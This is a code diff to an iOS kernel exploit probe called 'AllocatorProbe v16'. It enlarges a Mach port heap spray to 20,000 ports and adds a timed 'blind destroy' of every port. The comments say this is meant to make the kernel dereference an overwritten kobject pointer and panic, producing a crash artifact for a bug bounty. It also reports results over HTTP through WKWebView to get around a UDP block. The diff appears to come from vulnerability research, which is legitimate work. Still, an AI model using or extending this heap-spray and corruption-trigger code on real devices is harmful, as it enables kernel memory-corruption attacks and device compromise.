@@ -1,7 +1,11 @@
 /*
- * AllocatorProbe v16 — HTTP Reporting + Broad Kobject Scan
- * =========================================================
- * Changes from prior v16 (pure-scan):
+ * AllocatorProbe v16 — N=20000 + Blind-Destroy + HTTP Reporting + Broad Scan
+ * ===========================================================================
+ * Changes from v15:
+ *   - NUM_PORTS 5000 → 20000: P(at least one overlap per fire cycle) ≈ 0.90
+ *   - BLIND_DESTROY: after 300s, destroys ALL ports unconditionally — forces
+ *     kernel ipc_kobject_destroy on any overwritten port without waiting for scan
+ *     to detect kotype=2. Works even when the overflow writes a partial struct.
  *   - FIXED: UDP blocked by nehelper — replaced with WKWebView async XHR to port 9999
  *   - WKWebView is minimal (about:blank) — no GPU firing from this process
  *   - BROADENED: scan now reports PORT_CHANGED for ANY port where kotype!=0 OR kobject!=0
@@ -26,16 +30,18 @@
 #include <stdio.h>
 #include <stdarg.h>
 
-#define NUM_PORTS        5000
-#define NUM_SOCKETS      200
-#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
-#define REPORT_HOST      "192.168.68.109"
+#define NUM_PORTS           20000
+#define NUM_SOCKETS         200
+#define COMMPAGE_TARGET     0x0000000FFFFFC330ULL
+#define REPORT_HOST         "192.168.68.109"
+#define BLIND_DESTROY_DELAY_S 300   /* 5 min: fire completes ~3-4 min, destroy before GPU recovers */
 
 static mach_port_t g_ports[NUM_PORTS];
 static int         g_port_count = 0;
 static int         g_socks[NUM_SOCKETS];
 static int         g_sock_count = 0;
 static _Atomic int g_found = 0;
+static _Atomic int g_blind_done = 0;
 static WKWebView  *g_webView = nil;
 
 /* HTTP POST via WKWebView async XHR — bypasses nehelper UDP block */
@@ -82,6 +88,28 @@ static void spray(void) {
     }
     ev("V16_SPRAY socks=%d ports=%d target=0x%016llx",
        g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
+}
+
+/* Blind-destroy: called after BLIND_DESTROY_DELAY_S seconds.
+ * Destroys all sprayed ports unconditionally — forces kernel to clean up
+ * ipc_kobject for every port. If any ip_kobject was overwritten with
+ * COMMPAGE_TARGET, ipc_kobject_destroy dereferences it → EL1 kernel panic
+ * with GPR = 0x0000000FFFFFC330 → qualifying ⚑ $125K IPS artifact. */
+static void blind_destroy(void) {
+    if (atomic_fetch_or(&g_blind_done, 1)) return;  /* run once */
+    mach_port_t task = mach_task_self();
+    int destroyed = 0;
+    for (int i = 0; i < g_port_count; i++) {
+        if (g_ports[i] != MACH_PORT_NULL) {
+            mach_port_destroy(task, g_ports[i]);
+            g_ports[i] = MACH_PORT_NULL;
+            destroyed++;
+        }
+    }
+    ev("BLIND_DESTROY n=%d delay=%ds", destroyed, BLIND_DESTROY_DELAY_S);
+    /* Exit after 2s so monitor relaunches with a fresh port spray */
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC),
+                   dispatch_get_main_queue(), ^{ exit(0); });
 }
 
 static void scan_background(void) {
@@ -157,7 +185,14 @@ static void scan_background(void) {
 
     spray();
 
-    ev("V16_LAUNCH AllocatorProbe v16 http-reporting broad-scan");
+    /* Schedule blind-destroy: unconditionally destroys all ports after delay.
+     * Triggers kernel ipc_kobject_destroy on any overwritten port → EL1 panic. */
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,
+                                 (int64_t)BLIND_DESTROY_DELAY_S * NSEC_PER_SEC),
+                   dispatch_get_main_queue(), ^{ blind_destroy(); });
+
+    ev("V16_LAUNCH AllocatorProbe v16 N=%d blind-destroy=%ds http-reporting broad-scan",
+       g_port_count, BLIND_DESTROY_DELAY_S);
 
     self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                       target:self
